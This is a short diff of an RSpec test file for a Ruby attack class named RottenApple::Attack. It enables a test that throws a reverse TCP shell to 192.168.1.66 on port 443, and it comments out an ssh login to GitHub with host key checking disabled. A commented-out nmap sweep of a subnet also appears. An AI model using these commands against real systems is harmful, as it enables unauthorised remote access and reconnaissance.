@@ -10,9 +10,9 @@ describe RottenApple::Attack do
     subject{@attack}
     its(:class) {should == RottenApple::Attack}
     
-    #it "should throw a reverse tcp shell" do
-    # subject.reverse_shell('10.225.71.7', 1337)
-    #end
+    it "should throw a reverse tcp shell" do
+     subject.reverse_shell('192.168.1.66', 443)
+    end
 
     #it "should perform an NMAP scan" do
     #  subject.command('nmap -p 80,443 --open -Pn -P0 -n -T4 10.255.71.0/24')
@@ -22,9 +22,9 @@ describe RottenApple::Attack do
     #  subject.command('ls ../../')
     #end
 
-    it "should allow me to authenticate to github" do
-      subject.command('ssh -o "StrictHostKeyChecking no" -o ConnectTimeout=10 -T git@github.com')
-    end
+    #it "should allow me to authenticate to github" do
+    #  subject.command('ssh -o "StrictHostKeyChecking no" -o ConnectTimeout=10 -T git@github.com')
+    #end
   end
 
 end
